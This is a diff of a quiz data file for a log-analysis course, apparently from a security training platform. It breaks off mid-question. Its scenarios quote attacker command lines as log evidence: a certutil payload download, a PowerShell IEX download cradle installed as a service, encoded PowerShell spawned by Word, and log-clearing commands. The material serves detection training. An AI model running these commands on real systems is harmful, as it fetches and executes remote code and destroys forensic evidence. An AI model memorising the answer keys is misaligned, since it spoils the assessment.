@@ -1043,751 +1043,803 @@ export const quizzes: QuizData[] = [
       }
     ]
   },
-  // Log Analysis Course Quizzes
+  // Log Analysis Course Quizzes — scenario-based upgrade
   {
     quizId: "la-q1",
     courseId: "log-analysis",
-    title: "Log Fundamentals Quiz",
-    description: "Test your understanding of log basics, formats, and importance in security.",
-    passingScore: 70,
-    timeLimit: 15,
+    title: "Log Fundamentals: Formats, Sources & Triage Mindset",
+    description: "Scenario-based assessment on log formats, timestamps, normalization, and the analyst mindset for raw log triage.",
+    passingScore: 75,
+    timeLimit: 20,
     questions: [
-      {
-        id: "la-q1-1",
-        question: "What is the primary purpose of log files in IT systems?",
-        options: [
-          "To slow down system performance",
-          "To record events, activities, and system states for analysis",
-          "To store user passwords securely",
-          "To replace backup systems"
-        ],
-        correctAnswer: 1,
-        explanation: "Log files record events, activities, and system states, providing crucial information for troubleshooting, security analysis, and compliance."
-      },
-      {
-        id: "la-q1-2",
-        question: "Which log format uses key=value pairs for structured data?",
-        options: [
-          "JSON",
-          "XML",
-          "Key-Value (KV)",
-          "CSV"
-        ],
-        correctAnswer: 2,
-        explanation: "Key-Value format uses key=value pairs (e.g., user=admin action=login) making it easy to parse and search."
-      },
-      {
-        id: "la-q1-3",
-        question: "What does the term 'log rotation' refer to?",
-        options: [
-          "Spinning hard drives that store logs",
-          "Automatically archiving old logs and creating new ones to manage disk space",
-          "Rotating between different log formats",
-          "Changing log file permissions"
-        ],
-        correctAnswer: 1,
-        explanation: "Log rotation automatically archives old log files and creates new ones to prevent disk space exhaustion and maintain manageability."
-      },
-      {
-        id: "la-q1-4",
-        question: "Which timestamp format is considered the international standard for log files?",
-        options: [
-          "MM/DD/YYYY",
-          "DD-MM-YYYY",
-          "ISO 8601 (YYYY-MM-DDTHH:MM:SS)",
-          "Unix epoch only"
-        ],
-        correctAnswer: 2,
-        explanation: "ISO 8601 (YYYY-MM-DDTHH:MM:SS) is the international standard that provides unambiguous, sortable timestamps."
-      },
-      {
-        id: "la-q1-5",
-        question: "What is centralized log management?",
-        options: [
-          "Storing logs only on local machines",
-          "Collecting logs from multiple sources into a single location for analysis",
-          "Deleting logs after 24 hours",
-          "Encrypting all log files"
-        ],
-        correctAnswer: 1,
-        explanation: "Centralized log management collects logs from multiple sources into a single location, enabling correlation, analysis, and long-term retention."
-      },
-      {
-        id: "la-q1-6",
-        question: "Which log level indicates a serious problem that needs immediate attention?",
-        options: [
-          "DEBUG",
-          "INFO",
-          "WARNING",
-          "ERROR/CRITICAL"
-        ],
-        correctAnswer: 3,
-        explanation: "ERROR and CRITICAL levels indicate serious problems requiring immediate attention, while DEBUG and INFO are for routine information."
-      },
-      {
-        id: "la-q1-7",
-        question: "What is the main advantage of JSON-formatted logs?",
-        options: [
-          "They are smaller in size",
-          "They are human-readable only",
-          "They are structured and easily parsed by machines",
-          "They cannot contain nested data"
-        ],
-        correctAnswer: 2,
-        explanation: "JSON logs are structured, machine-parseable, and can contain nested data, making them ideal for automated analysis."
-      },
-      {
-        id: "la-q1-8",
-        question: "Why is consistent timestamping important in log analysis?",
-        options: [
-          "It makes logs look professional",
-          "It enables accurate event correlation across multiple systems",
-          "It reduces storage requirements",
-          "It's required by all operating systems"
-        ],
-        correctAnswer: 1,
-        explanation: "Consistent timestamps enable accurate event correlation across multiple systems, critical for incident investigation and timeline reconstruction."
-      },
-      {
-        id: "la-q1-9",
-        question: "What is a log aggregator?",
-        options: [
-          "A tool that deletes logs",
-          "A tool that collects and consolidates logs from multiple sources",
-          "A type of malware",
-          "A log encryption tool"
-        ],
-        correctAnswer: 1,
-        explanation: "A log aggregator collects and consolidates logs from multiple sources, making centralized analysis and searching possible."
-      },
-      {
-        id: "la-q1-10",
-        question: "Which of the following is NOT a common log source in enterprise environments?",
-        options: [
-          "Firewalls and IDS/IPS",
-          "Web servers and applications",
-          "User personal diaries",
-          "Authentication systems"
-        ],
-        correctAnswer: 2,
-        explanation: "Common enterprise log sources include firewalls, IDS/IPS, web servers, applications, and authentication systems - not personal documents."
-      }
+        {
+          id: "la-q1-1",
+          difficulty: "easy",
+          tags: ["Log Formats", "Parsing"],
+          scenario: "Three log shippers feed your SIEM. Sample lines below — same login event, three formats:\n  A) 2026-06-15T08:14:22Z user=jdoe src=10.1.4.55 action=login status=success\n  B) {\"ts\":\"2026-06-15T08:14:22Z\",\"user\":\"jdoe\",\"src\":\"10.1.4.55\",\"action\":\"login\",\"status\":\"success\"}\n  C) Jun 15 08:14:22 host01 sshd[2231]: Accepted password for jdoe from 10.1.4.55 port 51422 ssh2",
+          question: "You need to parse all three reliably into the same schema. Which is true?",
+          options: [
+            "A is JSON, B is KV, C is CEF — all are equally easy to parse.",
+            "B (JSON) is the most parser-friendly and self-describing; A (KV) needs a key=value extractor; C (syslog free-text) requires a regex/grok pattern.",
+            "C should be preferred because it is human-readable and never breaks.",
+            "All three should be stored as raw blobs without parsing to save CPU.",
+          ],
+          correctAnswer: 1,
+          explanation: "B is structured JSON — parsers handle nested fields natively. A is KV (key=value), easy but flat. C is classic free-text syslog where field positions vary by daemon — grok/regex is needed and breaks when the vendor changes the format. Storing raw blobs (D) destroys search performance."
+        },
+        {
+          id: "la-q1-2",
+          difficulty: "easy",
+          tags: ["Timestamps", "Correlation"],
+          scenario: "Two systems log the same SSH login:\n  Firewall: 2026-06-15 08:14:22 +0000\n  Linux host: Jun 15 03:14:21 EST",
+          question: "Why is this a problem for correlation, and what is the FIRST thing to fix?",
+          options: [
+            "No problem — the events are obviously the same.",
+            "Enforce a single time standard (UTC) and ISO 8601 on every source; NTP-sync all hosts before tuning correlation rules.",
+            "Adjust the SIEM rule to accept a 6-hour window so anything matches.",
+            "Drop the Linux log because it uses a legacy format.",
+          ],
+          correctAnswer: 1,
+          explanation: "Mixed time zones + non-ISO formats are the #1 cause of broken timeline reconstruction. Standardize on UTC ISO-8601 and NTP — widening the window (C) just hides drift and creates false correlations."
+        },
+        {
+          id: "la-q1-3",
+          difficulty: "medium",
+          tags: ["Log Levels", "Noise"],
+          scenario: "Your app emits ~4M DEBUG lines/day. Storage cost is exploding and analysts ignore the index. The dev team insists DEBUG must stay 'for troubleshooting'.",
+          question: "What is the right SOC-side action?",
+          options: [
+            "Forward everything to the hot SIEM tier — storage is cheap.",
+            "Drop DEBUG at the forwarder, send WARNING+ to the hot tier, and route INFO/DEBUG to cheap cold storage with a 7-day retention for dev access.",
+            "Disable application logging entirely.",
+            "Keep DEBUG but mute all alerts.",
+          ],
+          correctAnswer: 1,
+          explanation: "Tiered retention is the standard answer: hot tier for security-relevant levels (WARNING/ERROR/CRITICAL + auth/audit), cold tier for verbose dev logs. This preserves the dev workflow without bankrupting the SIEM license."
+        },
+        {
+          id: "la-q1-4",
+          difficulty: "medium",
+          tags: ["Normalization", "CIM"],
+          scenario: "Three sources call the same field different names:\n  Palo Alto: src\n  Cisco ASA: SourceIP\n  Windows: IpAddress",
+          question: "What concept lets you write ONE detection that matches all three?",
+          options: [
+            "Log rotation",
+            "Field normalization to a common schema (e.g. Splunk CIM, Elastic ECS) — every source maps its native field to src_ip at ingest.",
+            "Storing logs in CSV",
+            "Encrypting logs in transit",
+          ],
+          correctAnswer: 1,
+          explanation: "Field normalization (CIM / ECS / OCSF) is the foundation of multi-source detection. Without it every rule needs N OR-clauses and breaks the day a new product is added."
+        },
+        {
+          id: "la-q1-5",
+          difficulty: "medium",
+          tags: ["Log Sources", "Coverage"],
+          scenario: "Management asks: 'We have firewall logs — isn't that enough?' You map current coverage:\n  ✅ Perimeter firewall\n  ❌ Endpoint (no EDR/Sysmon)\n  ❌ Identity (no AD audit)\n  ❌ DNS\n  ❌ Cloud audit (AWS CloudTrail)",
+          question: "Which gap most directly blinds you to a successful phishing → credential theft → lateral movement chain?",
+          options: [
+            "Firewall is fine on its own.",
+            "Endpoint + identity logs — phishing payload execution and credential abuse happen on the host and in AD; the firewall sees only the C2 egress at best.",
+            "Cloud audit logs — they would catch the phishing email.",
+            "DNS logs are the only thing that matters.",
+          ],
+          correctAnswer: 1,
+          explanation: "Perimeter alone misses everything that happens AFTER initial access. Endpoint (process/file/network) and identity (4624/4625/4768/4769) telemetry are the bare-minimum additions to detect post-exploitation."
+        },
+        {
+          id: "la-q1-6",
+          difficulty: "easy",
+          tags: ["Log Integrity", "Forensics"],
+          scenario: "Mid-incident, a senior dev offers to 'clean up' a noisy production log file on the compromised host before forensics arrives.",
+          question: "Correct response?",
+          options: [
+            "Let them — DEBUG lines are noise anyway.",
+            "Refuse and preserve. Logs on a compromised host are evidence; hash them, copy to write-once storage, and maintain chain of custody.",
+            "Delete the file yourself to keep it simple.",
+            "Email the file to yourself and then delete the original.",
+          ],
+          correctAnswer: 1,
+          explanation: "Once an incident is declared, on-host logs are evidence. Hash (SHA-256), copy to WORM/immutable storage, and document chain of custody. Modifying or deleting is potential spoliation."
+        },
+        {
+          id: "la-q1-7",
+          difficulty: "medium",
+          tags: ["Centralization", "Architecture"],
+          question: "Why is shipping logs OFF the endpoint (to a central SIEM/syslog server) a security control, not just an operational one?",
+          options: [
+            "It makes logs prettier.",
+            "An attacker with local admin can clear/modify local logs (e.g. wevtutil cl, > /var/log/auth.log) — central copies survive because the attacker has no privileges on the SIEM.",
+            "It reduces CPU on the SIEM.",
+            "Central logs are required by HTTPS.",
+          ],
+          correctAnswer: 1,
+          explanation: "Log centralization defeats anti-forensics: T1070.001 (Clear Windows Event Logs) and T1070.002 (Clear Linux/Mac Logs) only erase the local copy. The shipped copy is your source of truth."
+        },
+        {
+          id: "la-q1-8",
+          difficulty: "medium",
+          tags: ["Retention", "Compliance"],
+          scenario: "Your CISO asks 'what's the minimum log retention we need?' You have PCI-DSS scope (cardholder data) and a typical breach dwell time of 200+ days.",
+          question: "Best answer?",
+          options: [
+            "30 days — that's what the firewall vendor defaults to.",
+            "At least 1 year total with the most recent 3 months immediately searchable; PCI-DSS requires ≥1 year retention with ≥3 months online, and dwell-time data shows shorter windows miss the initial compromise.",
+            "7 days — anything older is irrelevant.",
+            "Indefinite retention of every log on hot storage.",
+          ],
+          correctAnswer: 1,
+          explanation: "PCI-DSS req. 10.5.1 — ≥1 year retention, ≥3 months immediately available. Mandiant/IBM dwell-time data (~200d median) means shorter windows literally cannot reach the initial intrusion. Indefinite hot storage (D) is wasteful — use cold/cheap tiers for older data."
+        },
+        {
+          id: "la-q1-9",
+          difficulty: "hard",
+          tags: ["Parsing", "Detection Quality"],
+          scenario: "A new SaaS app sends logs as:\n  2026-06-15 08:14:22 LOGIN user=\"jdoe\" result=\"OK\" geo=\"IN-Bengaluru\" device=\"mac/Chrome\"\nThe SIEM ingests them as a single unparsed message field. The 'failed logins' dashboard shows ZERO events for this app despite obvious failures.",
+          question: "Root cause and fix?",
+          options: [
+            "The SIEM is broken — open a P1 with the vendor.",
+            "The source is ingested but not parsed — without field extraction, dashboards that filter on result=FAIL never match. Write a parser (props.conf / ingest pipeline / grok) to extract user, result, geo, device.",
+            "The app is not generating failures.",
+            "Failed-login dashboards do not work on SaaS logs.",
+          ],
+          correctAnswer: 1,
+          explanation: "Classic 'ingested but invisible' problem. Without field extraction, the message is one big string and structured filters miss. Build the parser/ingest pipeline, then backfill or wait for new events to populate the dashboard."
+        },
+        {
+          id: "la-q1-10",
+          difficulty: "hard",
+          tags: ["Triage Mindset", "Pivoting"],
+          scenario: "You see a single suspicious line in the proxy log: a workstation contacting hxxp://185.234.x.x/update.bin at 03:11 local. You have 10 minutes before standup.",
+          question: "Which pivot order produces the most signal fastest?",
+          options: [
+            "Block the IP at the firewall, close the alert, move on.",
+            "Pivot: (1) DNS log for what resolved that IP, (2) EDR for the process that initiated the connection, (3) auth log for who was on the host at 03:11, (4) proxy for other hosts hitting the same IP — THEN decide on containment.",
+            "Email the user and ask if they downloaded anything.",
+            "Restart the workstation to clear any malware.",
+          ],
+          correctAnswer: 1,
+          explanation: "Containment without investigation (A) destroys context and tells the attacker they're caught. The pivot order — network → process → user → blast-radius — is the standard Tier 1/2 enrichment chain before any block/isolate decision."
+        },
     ]
   },
   {
     quizId: "la-q2",
     courseId: "log-analysis",
-    title: "Windows Log Analysis",
-    description: "Master Windows Event Log analysis including Security, System, and Application logs.",
+    title: "Windows Event Log Investigation",
+    description: "Hands-on triage of Security, System, and Sysmon events — logon types, process creation, persistence, and lateral movement.",
     passingScore: 75,
     timeLimit: 25,
     questions: [
-      {
-        id: "la-q2-1",
-        question: "Which Windows Event ID indicates a successful user logon?",
-        options: [
-          "4625",
-          "4624",
-          "4634",
-          "4648"
-        ],
-        correctAnswer: 1,
-        explanation: "Event ID 4624 records successful logon events. 4625 is failed logon, 4634 is logoff, and 4648 is explicit credential logon."
-      },
-      {
-        id: "la-q2-2",
-        question: "What does Windows Event ID 4625 indicate?",
-        options: [
-          "Successful logon",
-          "Failed logon attempt",
-          "Account lockout",
-          "Password change"
-        ],
-        correctAnswer: 1,
-        explanation: "Event ID 4625 indicates a failed logon attempt, critical for detecting brute force attacks and unauthorized access attempts."
-      },
-      {
-        id: "la-q2-3",
-        question: "Which logon type value (in Event 4624) indicates interactive logon at the console?",
-        options: [
-          "Type 2",
-          "Type 3",
-          "Type 10",
-          "Type 7"
-        ],
-        correctAnswer: 0,
-        explanation: "Logon Type 2 is interactive logon at the console. Type 3 is network, Type 10 is RemoteInteractive (RDP), Type 7 is unlock."
-      },
-      {
-        id: "la-q2-4",
-        question: "What Windows Event ID should you monitor for new user account creation?",
-        options: [
-          "4624",
-          "4720",
-          "4688",
-          "4672"
-        ],
-        correctAnswer: 1,
-        explanation: "Event ID 4720 indicates a new user account was created. This is important for detecting unauthorized account creation."
-      },
-      {
-        id: "la-q2-5",
-        question: "Which Event ID indicates a process was created (process tracking)?",
-        options: [
-          "4624",
-          "4625",
-          "4688",
-          "4720"
-        ],
-        correctAnswer: 2,
-        explanation: "Event ID 4688 records process creation events, essential for tracking what programs are executed on a system."
-      },
-      {
-        id: "la-q2-6",
-        question: "What does Event ID 4672 indicate?",
-        options: [
-          "User logoff",
-          "Special privileges assigned to new logon",
-          "Account disabled",
-          "Password reset"
-        ],
-        correctAnswer: 1,
-        explanation: "Event ID 4672 indicates special privileges (like admin rights) were assigned to a new logon session."
-      },
-      {
-        id: "la-q2-7",
-        question: "Which Windows log stores security-related events like logons and audit events?",
-        options: [
-          "Application Log",
-          "System Log",
-          "Security Log",
-          "Setup Log"
-        ],
-        correctAnswer: 2,
-        explanation: "The Security Log stores security-related events including logons, logoffs, policy changes, and audit events."
-      },
-      {
-        id: "la-q2-8",
-        question: "What is the significance of multiple 4625 events followed by a 4624 from the same source?",
-        options: [
-          "System error",
-          "Possible successful brute force attack",
-          "Normal user behavior",
-          "Log corruption"
-        ],
-        correctAnswer: 1,
-        explanation: "Multiple failed logons (4625) followed by a successful logon (4624) from the same source may indicate a successful brute force attack."
-      },
-      {
-        id: "la-q2-9",
-        question: "Which Event ID indicates an account was added to a security-enabled group?",
-        options: [
-          "4728",
-          "4720",
-          "4624",
-          "4625"
-        ],
-        correctAnswer: 0,
-        explanation: "Event ID 4728 indicates a member was added to a security-enabled global group, important for privilege escalation detection."
-      },
-      {
-        id: "la-q2-10",
-        question: "What tool is commonly used to view Windows Event Logs?",
-        options: [
-          "Task Manager",
-          "Event Viewer",
-          "Registry Editor",
-          "Device Manager"
-        ],
-        correctAnswer: 1,
-        explanation: "Event Viewer (eventvwr.msc) is the built-in Windows tool for viewing and analyzing Windows Event Logs."
-      },
-      {
-        id: "la-q2-11",
-        question: "What does Logon Type 3 indicate in Windows Event 4624?",
-        options: [
-          "Local console logon",
-          "Network logon (accessing shared folders)",
-          "Remote Desktop logon",
-          "Service account logon"
-        ],
-        correctAnswer: 1,
-        explanation: "Logon Type 3 indicates network logon, typically when accessing shared folders, printers, or other network resources."
-      },
-      {
-        id: "la-q2-12",
-        question: "Which Event ID indicates Windows Defender detected malware?",
-        options: [
-          "1116",
-          "4624",
-          "7045",
-          "4688"
-        ],
-        correctAnswer: 0,
-        explanation: "Event ID 1116 in Microsoft-Windows-Windows Defender/Operational log indicates malware detection."
-      }
+        {
+          id: "la-q2-1",
+          difficulty: "easy",
+          tags: ["EID 4624", "Logon Types"],
+          scenario: "Security log on FIN-WS-12:\n  EventID=4624  Account=jdoe  LogonType=3  SourceNetworkAddress=10.4.2.55  AuthPackage=NTLM  Time=02:47\nUser jdoe is in IT, normally logs in at 09:00 via interactive console.",
+          question: "What is the most accurate interpretation?",
+          options: [
+            "Routine console login — ignore.",
+            "Network logon (Type 3) over NTLM at 02:47 from a different subnet — possible lateral movement / pass-the-hash. Investigate the source host and check 4768/4769 on the DC.",
+            "Service account login — normal.",
+            "Scheduled task (Type 4) — benign.",
+          ],
+          correctAnswer: 1,
+          explanation: "Logon Type 3 = network logon (SMB/WMI). NTLM at odd hours from an unusual source is a hallmark of lateral movement. Pivot to the source host's 4648 (explicit credentials) and the DC's 4769 (TGS) for Kerberoasting/PtH context."
+        },
+        {
+          id: "la-q2-2",
+          difficulty: "easy",
+          tags: ["EID 4625", "Brute Force"],
+          scenario: "Domain Controller security log shows in 90 seconds:\n  4625 Account=admin  SubStatus=0xC000006A  Source=203.0.113.77   ×42\n  4625 Account=root   SubStatus=0xC0000064  Source=203.0.113.77   ×31\n  4625 Account=test   SubStatus=0xC0000064  Source=203.0.113.77   ×28",
+          question: "What attack pattern is this?",
+          options: [
+            "Single user mistyping their password.",
+            "Password spraying / brute force from a single source — note 0xC0000064 (user does not exist) vs 0xC000006A (wrong password); mix of both = enumeration plus guessing.",
+            "Kerberoasting — request for service tickets.",
+            "Golden Ticket forgery.",
+          ],
+          correctAnswer: 1,
+          explanation: "0xC0000064 = unknown user (enumeration); 0xC000006A = bad password against a real user. High volume + multiple accounts + one source IP = brute force / spray. Containment: block source, alert IR, check for any 4624 success from the same IP."
+        },
+        {
+          id: "la-q2-3",
+          difficulty: "medium",
+          tags: ["EID 4688", "Process Creation"],
+          scenario: "EID 4688 on FIN-HR-04:\n  NewProcessName=C:\\Windows\\System32\\cmd.exe\n  ParentProcessName=C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\n  CommandLine=cmd /c powershell -enc JABzAD0ATgBlAHcA...",
+          question: "Triage call?",
+          options: [
+            "Benign — Word often launches cmd for macros.",
+            "High-confidence malicious: Office spawning cmd → encoded PowerShell is a textbook maldoc execution chain (T1566.001 → T1059.003). Isolate the host, capture the parent .docx, hunt the encoded payload across the fleet.",
+            "Low priority — encoded PowerShell is normal in enterprises.",
+            "Ignore — 4688 is too noisy to trust.",
+          ],
+          correctAnswer: 1,
+          explanation: "WINWORD.EXE → cmd.exe → powershell -enc is one of the most reliable malicious patterns in Windows telemetry. Decode the base64 payload offline (don't execute) to confirm C2 / downloader behavior."
+        },
+        {
+          id: "la-q2-4",
+          difficulty: "medium",
+          tags: ["Sysmon EID 1", "LOLBin"],
+          scenario: "Sysmon Event ID 1:\n  Image=C:\\Windows\\System32\\certutil.exe\n  CommandLine=certutil -urlcache -split -f http://185.234.x.x/x.exe C:\\Users\\Public\\x.exe\n  ParentImage=C:\\Windows\\System32\\cmd.exe",
+          question: "What is happening?",
+          options: [
+            "Certificate maintenance — benign.",
+            "LOLBin abuse: certutil is being used as a file downloader (T1105 Ingress Tool Transfer). Block, isolate, hunt the URL and the dropped binary across the fleet.",
+            "Windows Update activity.",
+            "PKI enrollment.",
+          ],
+          correctAnswer: 1,
+          explanation: "certutil -urlcache -split -f <url> is a classic Living-Off-the-Land Binary download technique. Real PKI workflows never look like this. Hunt for the dropped binary's hash and any subsequent execution."
+        },
+        {
+          id: "la-q2-5",
+          difficulty: "medium",
+          tags: ["EID 7045", "Persistence"],
+          scenario: "System log on a Domain Controller:\n  EID=7045  ServiceName=AdobeUpdater_x86  ServiceFileName=cmd /c powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://...')\n  AccountName=LocalSystem",
+          question: "Verdict?",
+          options: [
+            "Legitimate Adobe update.",
+            "Malicious service installation for persistence (T1543.003). Adobe never installs a SYSTEM service that runs IEX from a URL. Stop the service, remove, capture the binary, and hunt 7045 with similar patterns fleet-wide.",
+            "Normal SCCM behavior.",
+            "Group Policy push.",
+          ],
+          correctAnswer: 1,
+          explanation: "EID 7045 with a PowerShell download-cradle as the service binary = classic persistence (T1543.003). Critical on a DC — escalate to IR immediately and check for similar entries on every host."
+        },
+        {
+          id: "la-q2-6",
+          difficulty: "medium",
+          tags: ["EID 4672", "Privilege"],
+          scenario: "EID 4672 (Special privileges assigned) fires on a workstation for the account 'helpdesk_temp' which is NOT in any admin group per AD.",
+          question: "Most likely cause?",
+          options: [
+            "4672 is informational — ignore.",
+            "Token manipulation or local admin assignment outside AD (T1134 / T1078). Verify the account's local group membership on the host, check recent 4732 (member added to local group) events.",
+            "MFA prompt.",
+            "Group Policy refresh.",
+          ],
+          correctAnswer: 1,
+          explanation: "4672 means SeDebug / SeTakeOwnership / SeTcb etc. were granted at logon. If AD says non-admin but 4672 fires, the host has a local admin assignment or the token was elevated. Pair with 4732/4720 to find when it happened."
+        },
+        {
+          id: "la-q2-7",
+          difficulty: "medium",
+          tags: ["EID 4720", "Account Creation"],
+          scenario: "On a member server (not a DC) at 03:22:\n  4720 New account 'svc_backup2' created\n  4732 svc_backup2 added to local Administrators\n  4624 Type 10 (RDP) from 10.7.7.7 by svc_backup2  at 03:25",
+          question: "What is this?",
+          options: [
+            "Sysadmin maintenance.",
+            "Attacker creating a local admin for persistence + remote access (T1136.001 + T1078.003). Disable the account, kill the RDP session, isolate the host, hunt 10.7.7.7 fleet-wide.",
+            "Backup software installation.",
+            "Domain join.",
+          ],
+          correctAnswer: 1,
+          explanation: "Local-admin creation followed by immediate RDP from an internal IP is a textbook persistence + lateral movement pattern. Don't just disable — preserve evidence and find how 10.7.7.7 itself was compromised."
+        },
+        {
+          id: "la-q2-8",
+          difficulty: "hard",
+          tags: ["Sysmon EID 3", "C2"],
+          scenario: "Sysmon Event ID 3 (network connect):\n  Image=C:\\Users\\jdoe\\AppData\\Local\\Temp\\update.exe\n  DestinationIp=185.234.x.x  DestinationPort=443  Initiated=true\nFiring every 58–62 seconds for the last 6 hours.",
+          question: "Best classification?",
+          options: [
+            "Browser keepalive.",
+            "Suspected C2 beacon — regular interval, binary in user Temp, external IP. Pull the binary for sandboxing, hunt the IP/domain across proxy + DNS, isolate the host.",
+            "Windows telemetry.",
+            "Antivirus update.",
+          ],
+          correctAnswer: 1,
+          explanation: "Periodic outbound from a user-writable Temp directory to a non-corporate IP is a textbook beacon. Even on 443 (TLS) the timing pattern (jitter ±2s around 60s) is the giveaway. JA3 fingerprinting on the proxy confirms."
+        },
+        {
+          id: "la-q2-9",
+          difficulty: "hard",
+          tags: ["EID 1102", "Anti-Forensics"],
+          scenario: "Security log shows:\n  EID 1102 'The audit log was cleared'  SubjectUserName=Administrator  Time=04:01\nNo prior 4634 (logoff) for that admin session.",
+          question: "Response?",
+          options: [
+            "Standard maintenance, ignore.",
+            "Treat as active intrusion — 1102 is anti-forensics (T1070.001). Pull the central SIEM copy (which the attacker can't reach), identify the logon session that issued the clear, isolate, and start IR.",
+            "Re-enable auditing and continue normal ops.",
+            "Reboot the server.",
+          ],
+          correctAnswer: 1,
+          explanation: "1102 by a non-routine account is one of the highest-fidelity 'adversary on the box' signals. The SIEM has the central copy — that's why we ship logs off-host. Pivot to the originating session (4624 Type 10 / Type 3) just before 04:01."
+        },
+        {
+          id: "la-q2-10",
+          difficulty: "hard",
+          tags: ["Kerberos", "4769"],
+          scenario: "On the DC:\n  Many 4769 (TGS request) events from workstation WKS-22 for service names like MSSQLSvc/db01.corp:1433, HTTP/sp01.corp, CIFS/file01.corp, all with TicketEncryptionType=0x17 (RC4-HMAC).",
+          question: "What attack is most likely?",
+          options: [
+            "Normal service usage.",
+            "Kerberoasting (T1558.003) — bulk TGS requests using RC4 so the tickets can be cracked offline for service-account passwords. Identify the requesting user, force a rotation of those service-account passwords, and migrate to AES + gMSA.",
+            "Golden Ticket use.",
+            "Pass-the-Hash.",
+          ],
+          correctAnswer: 1,
+          explanation: "RC4 (etype 0x17) TGS for many SPNs from one workstation is the Kerberoasting signature. Long-term fix: AES-only, group Managed Service Accounts, and long random passwords for SPN-bearing accounts."
+        },
     ]
   },
   {
     quizId: "la-q3",
     courseId: "log-analysis",
-    title: "Linux & Network Log Analysis",
-    description: "Analyze Linux system logs and network traffic patterns for security events.",
-    passingScore: 70,
+    title: "Linux & Network Log Investigation",
+    description: "Triage SSH, sudo, web, firewall, DNS, and proxy logs across realistic Linux/network scenarios.",
+    passingScore: 75,
     timeLimit: 25,
     questions: [
-      {
-        id: "la-q3-1",
-        question: "Where are authentication logs typically stored on Linux systems?",
-        options: [
-          "/var/log/messages",
-          "/var/log/auth.log or /var/log/secure",
-          "/var/log/syslog",
-          "/var/log/kern.log"
-        ],
-        correctAnswer: 1,
-        explanation: "Authentication logs are stored in /var/log/auth.log (Debian/Ubuntu) or /var/log/secure (RHEL/CentOS)."
-      },
-      {
-        id: "la-q3-2",
-        question: "Which Linux command displays the last logged in users?",
-        options: [
-          "who",
-          "last",
-          "top",
-          "ps"
-        ],
-        correctAnswer: 1,
-        explanation: "The 'last' command shows a list of last logged in users by reading from /var/log/wtmp."
-      },
-      {
-        id: "la-q3-3",
-        question: "What does the Linux log message 'Failed password for invalid user admin' indicate?",
-        options: [
-          "Successful admin login",
-          "Login attempt for a non-existent user called 'admin'",
-          "Password policy violation",
-          "System error"
-        ],
-        correctAnswer: 1,
-        explanation: "This message indicates someone tried to log in with username 'admin' which doesn't exist on the system - a common brute force indicator."
-      },
-      {
-        id: "la-q3-4",
-        question: "Which facility in syslog handles authentication messages?",
-        options: [
-          "kern",
-          "mail",
-          "auth/authpriv",
-          "daemon"
-        ],
-        correctAnswer: 2,
-        explanation: "The auth and authpriv facilities handle authentication and security-related messages in syslog."
-      },
-      {
-        id: "la-q3-5",
-        question: "What information is typically found in Apache access logs?",
-        options: [
-          "Only error messages",
-          "Client IP, timestamp, request method, URL, status code, user agent",
-          "Server configuration",
-          "Database queries"
-        ],
-        correctAnswer: 1,
-        explanation: "Apache access logs contain client IP, timestamp, HTTP method, requested URL, status code, size, and user agent."
-      },
-      {
-        id: "la-q3-6",
-        question: "Which HTTP status code in web logs indicates a successful request?",
-        options: [
-          "404",
-          "500",
-          "200",
-          "403"
-        ],
-        correctAnswer: 2,
-        explanation: "HTTP 200 indicates success. 404 is not found, 500 is server error, and 403 is forbidden."
-      },
-      {
-        id: "la-q3-7",
-        question: "What could multiple HTTP 404 errors from the same IP suggest?",
-        options: [
-          "Normal browsing",
-          "Directory enumeration or scanning activity",
-          "Successful file downloads",
-          "Server overload"
-        ],
-        correctAnswer: 1,
-        explanation: "Multiple 404 errors from one IP may indicate directory enumeration, vulnerability scanning, or reconnaissance activity."
-      },
-      {
-        id: "la-q3-8",
-        question: "In firewall logs, what does 'DENY' or 'DROP' indicate?",
-        options: [
-          "Traffic was allowed",
-          "Traffic was blocked by firewall rules",
-          "Firewall is offline",
-          "Connection was successful"
-        ],
-        correctAnswer: 1,
-        explanation: "DENY or DROP in firewall logs indicates the traffic was blocked according to firewall rules."
-      },
-      {
-        id: "la-q3-9",
-        question: "Which command would you use to follow a Linux log file in real-time?",
-        options: [
-          "cat /var/log/auth.log",
-          "tail -f /var/log/auth.log",
-          "head /var/log/auth.log",
-          "less /var/log/auth.log"
-        ],
-        correctAnswer: 1,
-        explanation: "The 'tail -f' command follows a file in real-time, showing new entries as they're written."
-      },
-      {
-        id: "la-q3-10",
-        question: "What does a sudden spike in DNS queries to unusual domains suggest?",
-        options: [
-          "Normal network activity",
-          "Possible malware communication or data exfiltration",
-          "DNS server upgrade",
-          "Improved network performance"
-        ],
-        correctAnswer: 1,
-        explanation: "Unusual DNS query patterns may indicate malware C2 communication, DNS tunneling, or data exfiltration attempts."
-      },
-      {
-        id: "la-q3-11",
-        question: "Which Linux log file contains kernel messages?",
-        options: [
-          "/var/log/auth.log",
-          "/var/log/kern.log or dmesg",
-          "/var/log/apache2/access.log",
-          "/var/log/mail.log"
-        ],
-        correctAnswer: 1,
-        explanation: "Kernel messages are stored in /var/log/kern.log and can be viewed with the 'dmesg' command."
-      },
-      {
-        id: "la-q3-12",
-        question: "What would you investigate if you see 'Accepted publickey for root' in auth.log?",
-        options: [
-          "Nothing, this is normal",
-          "Verify the SSH key is authorized and the source IP is legitimate",
-          "Disable SSH immediately",
-          "Increase logging verbosity"
-        ],
-        correctAnswer: 1,
-        explanation: "Root SSH access via public key should be verified - ensure the key is authorized and the source IP is expected and legitimate."
-      }
+        {
+          id: "la-q3-1",
+          difficulty: "easy",
+          tags: ["auth.log", "SSH"],
+          scenario: "/var/log/auth.log on web-edge-02:\n  Jun15 02:11 sshd[2231]: Failed password for invalid user oracle from 45.9.x.x port 51422 ssh2\n  Jun15 02:11 sshd[2232]: Failed password for invalid user postgres from 45.9.x.x port 51424 ssh2\n  Jun15 02:11 sshd[2233]: Failed password for invalid user admin from 45.9.x.x port 51426 ssh2\n  ... 800+ lines in 4 minutes ...",
+          question: "What is this and what is the FIRST correct mitigation?",
+          options: [
+            "Misconfigured monitoring — ignore.",
+            "SSH brute force / user enumeration from a single IP — block the IP at the edge (or fail2ban), confirm no 'Accepted' lines for the same source, then audit SSH config (disable password auth, key-only, restrict source).",
+            "DDoS — call the ISP.",
+            "Routine vulnerability scan from your own team.",
+          ],
+          correctAnswer: 1,
+          explanation: "'invalid user' = the username doesn't exist (enumeration). Block at the edge (cheap) before tuning. Critically, grep the same IP for 'Accepted password' — any success means the brute force already worked."
+        },
+        {
+          id: "la-q3-2",
+          difficulty: "easy",
